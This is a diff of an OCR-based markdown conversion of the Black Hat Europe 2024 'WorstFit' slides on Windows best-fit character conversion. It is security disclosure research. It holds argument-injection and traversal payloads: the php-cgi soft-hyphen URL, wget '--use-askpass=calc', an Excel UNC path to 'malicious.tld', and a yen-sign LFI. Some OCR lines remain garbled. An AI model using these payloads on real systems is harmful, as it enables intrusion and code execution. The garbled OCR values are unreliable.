@@ -8,13 +8,17 @@ year: 2024
 source_pdf: "BlackHat_Europe_2024_slides/Orange Tsai & Splitline Huang_WorstFit Unveiling Hidden Transformers in Windows ANSI.pdf"
 pages: 147
 sha256: "8d34486bab70aaeba2949656c67860e84b2c06f52b404f92a86b376f1c02d928"
-text_chars: 34734
-ocr_pages: 42
+text_chars: 31819
+ocr_pages: 34
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 87.3
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T22:47:54Z"
+converted_at: "2026-08-12T05:00:58Z"
 ---
 # WorstFit Unveiling Hidden Transformers in Windows ANSI
 
@@ -22,21 +26,19 @@ converted_at: "2026-08-11T22:47:54Z"
 **Conference:** Black Hat Europe 2024  
 **Source:** `BlackHat_Europe_2024_slides/Orange Tsai & Splitline Huang_WorstFit Unveiling Hidden Transformers in Windows ANSI.pdf` (147 pages)
 
+
 ## Slide 1
 
 # **BestFit**
 
 Unveiling Hidden Transformers in Windows ANSI! Orange Tsai × Splitline Huang
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-eS 5
-We erit
-“ —_— <7"
 Unveiling Hidden Transformers in Windows ANSI|!
 Orange Tsai x Splitline Huang
-2)
 DE A CORE blackhat
 ```
 
@@ -46,7 +48,8 @@ DE A CORE blackhat
 
 ## Slide 3
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 BY Windows PowerShell x +\yv
@@ -61,7 +64,8 @@ postgres=#
 
 $14.50
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 BY Windows PowerShell x +Fiv - Oo x
@@ -76,7 +80,8 @@ postgres=# SELECT name, balance FROM accounts WHERE name='splitline';
 
 SET balance = ' **∞** '
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 BY Windows PowerShell x +Fiv Oo
@@ -86,7 +91,6 @@ psql (17.2)
 Type "help" for help.
 postgres=# SELECT name, balance FROM accounts WHERE name='splitline';
 name | balance
-Grow SET balance = ‘co’ S fox
 postgres=# UPDATE accounts [SET balance='«') WHERE name='splitline';
 UPDATE 1
 postgres=#
@@ -94,7 +98,8 @@ postgres=#
 
 ## Slide 6
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 BY Windows PowerShell x +\yv Oo
@@ -104,7 +109,6 @@ psql (17.2)
 Type "help" for help.
 postgres=# SELECT name, balance FROM accounts WHERE name='splitline';
 name | balance
-ee CE
 splitline | 14.50
 (1 row)
 postgres=# UPDATE accounts SET balance='»' WHERE name='splitline';
@@ -116,7 +120,8 @@ postgres=# SELECT name, balance FROM accounts WHERE name='splitline' ;
 
 $8
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 BY Windows PowerShell x +Fiv Oo
@@ -126,14 +131,12 @@ psql (17.2)
 Type "help" for help.
 postgres=# SELECT name, balance FROM accounts WHERE name='splitline';
 name | balance
-ee CE
 splitline | 14.50
 (1 row)
 postgres=# UPDATE accounts SET balance='»' WHERE name='splitline';
 UPDATE 1
 postgres=# SELECT name, balance FROM accounts WHERE name='spLlitline';
 name
-“splitline |B xR $8 @
 (1 row)
 ```
 
@@ -141,7 +144,8 @@ name
 
 $8
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Reconnecting
@@ -157,16 +161,6 @@ DEVCORE Research Team
 Orange Tsai
 
 Splitline Huang
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-DEV CORE Researecn
-@ ORANGE TSA!
-SOYO6
-Seutune Luan
-/
-```
 
 ## Slide 10
 
@@ -231,20 +225,6 @@ Environment Variable
 File Name
 Windows Registry
 Command Line
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-getenv, _wgetenv | Microsof x +
-G] 23 learn.microsoft.com/en-us/cpp/c-run...
-Syntax
-char xgetenv(
-const char *varname
-)e
-wchar_t *_wgetenv(
-const wchar_t *varname
-ye
-```
 
 ## Slide 16
 
@@ -376,19 +356,13 @@ CVE-2024-4577
 
 http://vuln.host/index.php **?%ADs** Apache php-cgi.exe - sAD
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 78/100 on the text kept, 54/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-CVE-2024-4577 pg
-htto://vuln.host/index.ohp4%ADs
-i Ppoene | php-cgi.exe |AD|s
-& DB 227.0.0.1:8080/indexphpr%ads x =
-< S @  127.0.0.1:8080/index.php?%ads
 <?php
 if (l!empty($_SERVER[ 'HTTPS']) && (‘'on' == $ SERVER['HTTPS'])) {
-$uri. = ‘https://";
 } else {
-Suri. = "https7/" ;
 ```
 
 ## Slide 29
@@ -405,7 +379,8 @@ Browser http://vuln.host/? **%AD** s Soft hyphen Apache php-cgi.exe AD s php-cgi
 
 However, That was Just **the Tip of the Iceberg**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CVE-2024-4577
@@ -449,33 +424,16 @@ Attack Surfaces **CVE-2024-4577**
 
 ## Slide 34
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-W-LUWE...
-Lad
-FayF14Vv74
-‘My Documents’ 0 'G:¥’\
-```
-
 ## Slide 35
 
 G:¥
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-W-LUWE...
-Lad
-FayF14Vv74
-‘My Documents’ 0 'G:¥’’\
-```
 
 ## Slide 36
 
 As Same as the Korea Won SIgn (₩)
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Microsoft Windows [Version 10.0. 19045. 5131]
@@ -493,15 +451,6 @@ As Same as the Korea Won Slgn (\)
 ||**C**|
 |---|---|
 |**5**||
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-ISO 646: 7-Bits Standard allows National
-Defined Characters
-nc [fs [ww [ow [ne] ve [os [es fo
-bet ims Pee Pe Ps PT TT
-```
 
 ## Slide 38
 
@@ -545,10 +494,10 @@ U+00A5
 
 ## Slide 43
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-vv
 File Home Share View
 F= Command Prompt - python x Se ||
 Microsoft Windows [Version 10.0.19045.5131]
@@ -556,9 +505,7 @@ Microsoft Windows [Version 10.0.19045.5131]
 C:\Users\DEVCORE\Desktop>python
 Python 2.7.18 (v2.7.18; aa21f2, Apr 20 2020, 13:25:05) [MSC v.
 Type "help", "copyrig redits" or "License" for more informa
-'
 O
->>> os.listdir('.')
 ```
 
 ## Slide 44
@@ -567,42 +514,35 @@ O
 
 ## Slide 45
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-vv
 File Home Share View
 F= Command Prompt - python x Se ||
 Jicrosoft Windows [Version 10.0.19045.5131]
 Microsoft Corporation. All rights reserved.
-C:\Usrs\DEVCORE\Desktop>python
 Python\2.7.18 (v2.7.18:8d21aa21f2, Apr 20 2020, 13:25:05) [MSC v.
 Type "help", "copyright", "credits" or "License" for more informa
 grt os
-1 oy
 , 'desktop.ini']
-Bei\ eri Ne X
 ```
 
 ## Slide 46
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-vv
 File Home Share View
-ayiyey |
 F= Command Prompt - python x Se ||
 Microsoft Windows [Version 10.0.19045.5131]
 (c) Microsoft Corporation. All rights reserved.
-s
 C:\Users\DEVCORE\Desktop>p
 Python 2.7.18 (v2.7.18:8d2
 Type "help", "copyright",
 >>> import os
 >>> os.listdir('.')
-De Xee Nek ine desktop ani:
->>>_os.listdir( os.listdir('.')[0] )
 ['$Recycle.Bin', 'bootmgr', 'BOOTNXT', 'Documents and Settings',
 agefile.sys', 'PerfLogs', 'Program Files', 'Program Files (x86)',
 very', 'secret.txt', 'swapfile.sys', 'System Volume Information' ,
@@ -612,13 +552,12 @@ very', 'secret.txt', 'swapfile.sys', 'System Volume Information' ,
 
 ## Slide 47
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-v
 2
 ~ Automated Malware Analysis ae
-(G £3 cuckoosandbox.org/index.html
 About
 Being able to understand the way malware
 operate is the key to properly fight them. Cuckoo
@@ -646,17 +585,15 @@ Read more »
 
 At this point we **only fully support Python 2.7** . Older version of Python and Python 3 versions are not supported
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 w §H Requirements — Cuckoo Sa x +
 # Cuckoo Sandbox
-S
 Docs » Installation » Preparing the Host » Requirements © Edit on GitHub
-Va
 Requirements
 atest
-Neidalis eleyiaie \v= only fully support Python 2.7) @)lelqis Vass el9)
 of Python and Python 8 versions are not supported
 distributions)
 8 Installation
@@ -673,29 +610,19 @@ Sandbox Host
 
 Guest VM Guest VM Guest VM
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-cuckoo*: - WwW
-Eames) <8 88-65 oa ce
-=
-Gres VM GIEst VM Guest VM
-```
-
 ## Slide 50
 
 **WriteFile.exe**
 
 ##### **CreateFileW(L"..\u00A5..\u00A5…",…)**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 cuckoo*7 #= Recent *§ Pending Q Search Submit Import
 SUBMIT URLS/HASHES
 Submit URLs/hashes
-CreateFileW(L"..\u@@A5. .\u@@AS...”, ...)
-syatemninifo Bel] used | tora |
 From the press:
 FREE DISK SPACE CPU LOAD MEMORY USAGE
 ```
@@ -704,33 +631,23 @@ FREE DISK SPACE CPU LOAD MEMORY USAGE
 
 **Download**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 cuckoo<7” @ Dashboard Recent *% Pending Q Sea Submit Import
 Dropped Files
-—_ banca & Download |
 Size 6.5KB
 Type ASCII text
-MD5 a39168f9e20bba2cd67a9cclae3ef6d6
-SHA1 371be22301d323f14bca06711918d7b16085cc16
 SHA256 £374cada27d8da1556d061147c4b6b82e3f863e5e8ae58c0e8F0a613178979a8
 CRC32 B19B56BC
 ssdeep None
 Yara * vmdetect - Possibly employs anti-virtualization techniques
 VirusTotal Search for analysis
 Cuckoo Sandbox cuckoo<?” Back to Top
-o
-oO
-7)
 ©
 ©
-@
-)
-\
 ©
-2)
-Vi)
 ```
 
 ## Slide 52
@@ -739,46 +656,42 @@ Vi)
 
 **cuckoo.conf _**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 B C:\Users\cuckoo\.cuckoo\conf\cuckoo.conf - Sublime Text (UNREGISTERED)
 File Edit Selection Find View Goto Tools Project Preferences Help
-4% § cuckoo.conf
 [ cuckoo |
 # Enable or disable startup version check. When enabled, Cuckoo will connect
 # to a remote location to verify whether the running version is the latest
 # one available.
 version_check = yes
 # Cucki + bilities in
-= 44cuckoo.conf **
 # The authentication token that is required to access the Cuckoo API, using
 # HTTP Bearer authentication. This will protect the API instance against
 # unauthorized access and CSRF attacks. It is strongly recommended to set this
 > # to a secure value.
-16) api_token = Zqrzb@Ljk6xNEPh28R1aju
 ```
 
 ## Slide 53
 
 **Cuckoo Sandbox LFI to RCE**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Cuckoo Sandbox LFI to RCE
-G
 Recycle Bin
-coma X=
-202U-11-26 10:15:26,142 [cuckoo.core.startup] DEBUG:  |— MongoDB De CAWECOAS RaTONCma ae ascehy
 202U-11-26 10:15:26,142 [cuckoo.core.startup] DEBUG I Notification
 202U-11-26 10:15:26,142 [cuckoo.core.startup] DEBUG: SingleFile :\sers\cuckoo>agent .py
 262U-11-26 10:15:26,144 [cuckoo.core.startup] DEBUG: Checking for Locked tasks
 202U-11-26 19:15:26,158 [cuckoo.core.startup] DEBUG: Checking for pending service tasks.
 202U-11-26 10:15:26,153 [cuckoo.core.startup] DEBUG: Initializing Yara.
-202U-11-26 10:15:26,154 [cuckoo.core.startup] DEBUG:  |— binaries enbedded.yar
-202U-11-26 10:15:26,155 [cuckoo.core.startup] DEBUG:  |— binaries shellcodes.yar
-202U-11-26 10:15:26,155 [cuckoo.core.startup] DEBUG:  |— binaries vmdetect.yar
+202U-11-26 10:15:26,154 [cuckoo.core.startup] DEBUG: |— binaries enbedded.yar
+202U-11-26 10:15:26,155 [cuckoo.core.startup] DEBUG: |— binaries shellcodes.yar
+202U-11-26 10:15:26,155 [cuckoo.core.startup] DEBUG: |— binaries vmdetect.yar
 262U-11-26 10:15:26,169 [cuckoo] WARNING: It appears that you haven't loaded any Cuckoo S
 ignatures. Signatures are highly recommended and improve & enrich the information extract
 ed during an analysis. They also make up for the analysis score that you see in the Web I
@@ -791,9 +704,7 @@ er
 262U-11-26 10:15:26,256 [cuckoo.machinery. virtualbox] DEBUG: Stopping vm Win7
 202U-11-26 10:15:26,279 [cuckoo.core.scheduler] INFO: Loaded 1 machine/s
 202U-11-26 19:15:26,285 [cuckoo.core.scheduler] INFO: Waiting for analysis tasks
-1.
 orange@DESKTOP-31338:~$ python3 cuckoo-rce.py 192.168.8.137
-™)_ orange@DESKTOP-31338:
 ```
 
 ## Slide 54
@@ -906,7 +817,8 @@ import subprocess subprocess.run(
 
 Easy Peasy
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 BB Windows PowerShell
@@ -917,12 +829,9 @@ Type "help", "copyright", "credits" or "license" for more information.
 >>> import subprocess
 process.run(['wget.exe', f'http://example.tld/" --use-askpass=calc " .txt'])
 rom command "calc Username for 'http://example.tld': ": No s
-~
 wget.exe', 'http://example.tld/" --use-askpass=calc " .txt!
 import sul
 subproces
-[ ‘wget
-L}
 Easy Peasy de
 ```
 
@@ -932,11 +841,11 @@ Easy Peasy de
 
 **Exploit Safe Install Now!**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 94.87% CANT FIND THE DIFFERENCE!
-CU: KK KKKK
 B® Windows PowerShell
 PS C:\> python
 Python 3.10.4 (tags/v3.10.4:9d38120, Mar 23 2022
@@ -966,7 +875,8 @@ Difficulty: ★★★★★
 
 **Install Now!**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 BY Windows PowerShell x |
@@ -1140,13 +1050,13 @@ There must be more in the wild
 
 ## Slide 82
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 78/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ©) Studio-42/elFinder:@ Open x + v
 ws) Studio-42 / elFinder Q Type (7) to search Fes} +-~ © % €B <a>
 <> Code © Issues 6 11 Pullrequests 3 Q) Discussions © Actions ) wiki © Security 3 lx Insights
-elFinder Public @ Watch 237 + Y Fork 1.4k . yy Star 4.7k a
 ¥ master ~ | Y9| @ if) Demo:elFinder - Web FileMa xX = +
 e nao-pon Fix #363)
 github e | Fi n d e r Code
@@ -1174,7 +1084,8 @@ But arguments are all escaped by escapeshellarg!
 
 It executes command for creating archive
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 16
@@ -1190,7 +1101,6 @@ It executes command for creating archive
 6912
 6913
 6914
-eo1ic
 abstract class elFinderVolumeDriWer
 But arguments are all escaped
 by escapeshellarg!
@@ -1203,8 +1113,6 @@ if ($arc['ext'] === 'zip' && strpos($arc['argc'], '-tzip') === false) /{
 $prefix = './';
 $switch = '—- ';
 $cmd = $arc['cmd'] . ' ‘ . $arc["argc’] . ' * . $prefix Wentaresieeinratcanar) |. ' ' . $switch . implode(' ', $files);
-outs _ sss TT
-otisseprocexec{ $end, $o, $c, $err_out, $dir); |
 It executes command for creating archive
 ```
 
@@ -1214,7 +1122,8 @@ But arguments are all escaped by escapeshellarg! **All Escaped…** tar.exe -chf
 
 ## Slide 85
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 BZ Windows PowerShell
@@ -1222,7 +1131,6 @@ Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
 Install the latest PowerShell for new features and improvements! https://
 PS C:\Users\splitline>
-2r.htmii#elf_l1_Lw
 Folder is empty
 Drop to add items
 ```
@@ -1340,20 +1248,12 @@ Mitigation? Switch to **~~CJK Language~~** 。 **Chinese**
 
 C:\>assoc ... **.txt=txtfile** ... C:\>ftype ... txtfile= <u>%SystemRoot%\system32\NOTEPAD.EXE %1</u> ...
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-C:\>assoc
-.txt=txtfile
-C:\>ftype
-txtfile=%SystemRoot%\system32\NOTEPAD. EXE | 41
-```
-
 ## Slide 100
 
 NOTEPAD.EXE <FILENAME>
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 GZ Event &8 Process $ Stack
@@ -1385,7 +1285,8 @@ EXCEL.exe " **AA** " " **/a** " " **\\malicious.tld\xxx.xlsx** "
 
 **CVE-2024-49026 - Microsoft Excel Inject UNC to RCE**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CVE-2024-49026 - Microsoft Excel Inject UNC to RCE
@@ -1501,7 +1402,8 @@ Validate Server
 
 ## Slide 115
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 78/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 77 Ah shit, here we go again.
@@ -1533,12 +1435,12 @@ No input file specified error
 
 With IIS + PHP-CGI + <u>doc_root configured</u> It Can Become **LFI** !
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 With IIS + PHP-CGI + doc_root configured
 It Can Become LF!
-< GS A Notsecure | victim.tld/index.php/..¥..¥..¥..¥..¥Windows/win.ini/foo LW v= ee ~~
 ; for 16-bit app support [fonts] [extensions] [mci extensions] [files] [Mail] MAPI=1
 ```
 
@@ -1656,20 +1558,15 @@ But on Windows is **vulnerable** by default !
 
 ## Slide 126
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-\ - HelloWorld.exe C:\Users\Orange\source\rep< Le
 Edit Jump Search View Debugger Lum
-1: @vy Er: aA [Aly : fa] @
 ibrary function {J Regular function §§§ Instruction
-ae)
-—
 IDA View-A =) |
 int __fastcall| main( ant <
 {
-printf( "Hello World! \n'
-_ return @;
 }
 Synchronize with
 Copy
@@ -1688,22 +1585,18 @@ Gepetto
 Ctrl+C
 Shift+L
 N
-Y
 X
 /
-Cie
 ```
 
 ## Slide 127
 
 **Your** **main() is here**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 78/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-38 _scrt_current_native_startup_ state = initialized;
-39° «+}
-40 _scrt_release_startup_lock(v@);
 41 dyn_tls_init_callback = (_QWORD *) scrt_get_dyn_tls_init_callback(v3);
 42 v6 = (void (__fastcall **)(_QWORD, __int64))dyn_tls_init_callback;
 43 if ( *dyn_tls_init_callback && _scrt_is_nonwritable_in_current_image(dyn_tls_ init_
@@ -1711,14 +1604,11 @@ Cie
 45 dyn_tls_dtor_callback = (_tls_callback_type *) scrt_get_dyn_tls_dtor_callback(v5);
 46 v8 = dyn_tls_dtor_callback;
 47 if ( *dyn_tls_dtor_callback && _scrt_is_nonwritable_in_current_image(dyn_tls_dtor_
-48 register_thread_local_exe_atexit_callback_@(*v8);
 49 envp = get_initial_narrow_environment_@();
 50 argv = *_p__argv_@(); ; H
 Al oS eee en. Your main() is here
-52 ve main(yarecs argv, envp);
 53] if Tscrt_is_managed_app() )
 54 LABEL_20:
-55 exit_0(v@);
 ```
 
 ## Slide 128
@@ -1727,7 +1617,8 @@ Al oS eee en. Your main() is here
 
 **Your** **main() is here**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 77/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 38
@@ -1735,47 +1626,37 @@ Al oS eee en. Your main() is here
 40
 41
 42
-A2R
 47
 48
 49
 50
 51
 52
-aS
 54 LABEL_20:
-33
-_scrt_current_native_startup_ state = initialized;
 }
 _scrt_release startup_lock(v@);
 dyn_tls_init_callback = (_QWORD *) scrt_get_dyn_tls_init_callback(v3);
 v6 = (void (__fastcall **)(_QWORD, __int64))dyn_tls_init_callback;
 Gf fF ¥Fdvn t1e init callhack Q2 ecrt ic nanuwritahla in currant imaaaldun tle init
 if ( *dyn_tls_dtor_callback && _scrt_is_nonwritable in_current_ima
-register_thread_local_exe_atexit_callback_@(*v8);
 envp get_initial_narrow_environment_@();
 argv = *_p___argv_@();
-talis Geer
-arg¢—=—p_argc_0();
 ve 4 main(yarecs argv, envp);
 if T scrt_is_managed_app() )
-exit_@(ve);
 ```
 
 ## Slide 129
 
 **Your main() are here**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 B= Microsoft
 Visual Studio
 Best-in-class tools for any developer
 Visual Studio Visual Studio Code ~ Visual Studio for Mac
-OG File Edit View Project Bulld Debug Test Analyze
-e Pm 0 Smartes
-SmartHote1360.Pu
 ```
 
 ## Slide 130
@@ -1794,7 +1675,8 @@ int main(int argc,  char* argv[] ) { }
 
 The **safer** way: Use the wide-char version
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 The wmain function signature
@@ -1936,13 +1818,3 @@ https:// **Worst.Fit** /
 ## Thanks!
 
 research@devco.re @orange_8361 @_splitline_
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-DEVCORE
-Thanks!
-WA research@Qdevco.re
-NX @orange_8361
-X @-_soplitline_
-```
